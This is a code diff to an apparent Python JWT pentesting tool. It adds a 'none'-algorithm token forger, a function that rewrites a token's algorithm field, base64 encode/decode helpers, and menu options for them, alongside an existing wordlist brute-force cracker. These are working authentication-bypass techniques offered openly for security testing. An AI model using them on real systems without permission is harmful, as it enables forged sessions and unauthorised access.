@@ -135,6 +135,23 @@ def encode_jwt_ai():
 
     except Exception as e:
         print(RED + f"[-] AI-JWT Encoding error: {e}" + RESET)
+def none_algo_attack():
+    try:
+        token = input("Enter a JWT token: ").strip()
+        header, payload, _ = token.split(".")
+
+        # Change alg to 'none'
+        new_header = json.loads(decode_b64(header))
+        new_header['alg'] = 'none'
+        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
+
+        # Construct new token with empty signature
+        new_token = f"{header_b64}.{payload}."
+        print(GREEN + "[+] Forged JWT using 'none' algorithm:" + RESET)
+        print(new_token)
+    except Exception as e:
+        print(RED + f"[-] None Algorithm Attack error: {e}" + RESET)
+
 def brute_force(token, wordlist_path, threads=10):
     try:
         header, payload, signature = token.split(".")
@@ -181,6 +198,17 @@ def brute_force(token, wordlist_path, threads=10):
 
     except Exception as e:
         print(RED + f"[-] Brute force failed: {e}" + RESET)
+def serialize_to_base64():
+    try:
+        print(GREEN + "[*] Enter data in JSON format to encode to base64:" + RESET)
+        data = input().strip()
+        obj = json.loads(data)
+        encoded = base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")
+        print(GREEN + "[+] Serialized Base64 Token:" + RESET)
+        print(encoded)
+    except Exception as e:
+        print(RED + f"[-] Base64 serialization error: {e}" + RESET)
+
 def ai_token_suggestion():
     try:
         token = input("Enter a JWT or base64 token: ")
@@ -218,7 +246,33 @@ Token:
     except Exception as e:
         print(RED + f"[-] AI Token Suggestion error: {e}" + RESET)
 
+def change_jwt_algorithm():
+    try:
+        token = input("Enter JWT token: ").strip()
+        new_alg = input("Enter new algorithm (e.g. HS256): ").strip()
+        
+        header, payload, signature = token.split(".")
+        header_json = json.loads(decode_b64(header))
+        header_json["alg"] = new_alg
 
+        new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
+        new_token = f"{new_header_b64}.{payload}.{signature}"
+
+        print(GREEN + f"[+] JWT with modified alg='{new_alg}':" + RESET)
+        print(new_token)
+    except Exception as e:
+        print(RED + f"[-] Change JWT Algorithm error: {e}" + RESET)
+def deserialize_base64_token():
+    try:
+        print(GREEN + "[*] Enter base64-encoded string to decode:" + RESET)
+        b64_input = input().strip()
+        padded = b64_input + '=' * (-len(b64_input) % 4)
+        decoded = base64.urlsafe_b64decode(padded.encode()).decode()
+        json_obj = json.loads(decoded)
+        print(GREEN + "[+] Decoded JSON:" + RESET)
+        print(json.dumps(json_obj, indent=4))
+    except Exception as e:
+        print(RED + f"[-] Base64 deserialization error: {e}" + RESET)
 
 def main():
     banner()
@@ -231,12 +285,20 @@ def main():
         elif choice == "2":
             token = input("Enter the JWT: ")
             decode_jwt(token)
+        elif choice == "3":
+            deserialize_base64_token()
+        elif choice == "4":
+            serialize_to_base64()
         elif choice == "5":
             encode_jwt_ai()
         elif choice == "6":
             token = input("Enter JWT to crack: ")
             wordlist = input("Enter wordlist path: ")
             brute_force(token, wordlist)
+        elif choice == "7":
+            none_algo_attack()
+        elif choice == "8":
+            change_jwt_algorithm()
         elif choice == "9":
             ai_token_suggestion()
         elif choice == "10":
@@ -244,6 +306,7 @@ def main():
             break
         else:
             print(RED + "[-] Invalid choice. Try again." + RESET)
+
 
 if __name__ == "__main__":
     main()
